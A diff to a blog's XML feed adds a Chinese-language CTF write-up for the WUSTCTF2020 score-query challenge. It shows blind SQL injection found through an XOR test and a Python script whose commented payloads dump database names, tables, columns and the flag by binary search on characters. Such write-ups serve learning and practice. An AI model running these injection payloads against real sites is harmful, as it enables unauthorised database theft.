@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>WUSTCTF2020 颜值成绩查询_0x21-0x2F</title>
+      <link href="/2021/10/22/WUSTCTF2020-%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2-0x21-0x2F/"/>
+      <url>/2021/10/22/WUSTCTF2020-%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2-0x21-0x2F/</url>
+      
+        <content type="html"><![CDATA[<p>进去只有一个简单得输入框，测试下是否存在sql注入</p><p><img src="/2021/10/22/WUSTCTF2020-%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2-0x21-0x2F/image-20211022145243657.png" alt="image-20211022145243657"></p><p>先输入1，2，3等</p><p>发现有数据显示</p><p>使用异或</p><p><a href="http://fba65ac4-7e1e-4c73-bb3b-35bfdef68f71.node4.buuoj.cn:81/?stunum=0%5E1">http://fba65ac4-7e1e-4c73-bb3b-35bfdef68f71.node4.buuoj.cn:81/?stunum=0^1</a></p><p>结果显示得是stunum=1的界面</p><p>说明存在sql盲注</p><p>写一个简单脚本：</p><pre><code>import requestsimport timeurl = &quot;http://fba65ac4-7e1e-4c73-bb3b-35bfdef68f71.node4.buuoj.cn:81/&quot;data= &quot;&quot;for i in range(10000):    min = 32    max = 128    while (min &lt; max) :        mid = (min + max) // 2    # 爆破数据库名        #payload = &quot;?stunum=0^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)&quot;%(i,mid)    # 爆破表名        #payload = &quot;?stunum=0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&gt;%d)&quot;%(i,mid)    # 爆破字段        #payload = &quot;?stunum=0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flag&#39;)),%d,1))&gt;%d)&quot;%(i,mid)    # 爆破数据        payload = &quot;?stunum=0^(ascii(substr((select(group_concat(value))from(flag)),%d,1))&gt;%d)&quot;%(i,mid)        urls = url+payload        print(urls)        response = requests.get(url=urls)        time.sleep(0.2)        if &quot;Hi admin, your score is: 100&quot; in response.text:            min = mid+1        else:            max = mid        mid = (min + max) // 2    data += chr(mid)    print(data)</code></pre><p><img src="/2021/10/22/WUSTCTF2020-%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2-0x21-0x2F/image-20211022145433880.png" alt="image-20211022145433880"></p><p>写这个脚本花了挺长时间，原因是对sql注入语句还不熟练，容易被括号迷惑，看晕。</p><p>以后要注重写代码的能力。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+          <category> 刷题 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> SQL </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>CISCN2019 华北赛区 Day1 Web2 ikun_0x10-0x1F</title>
       <link href="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/"/>
       <url>/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/</url>
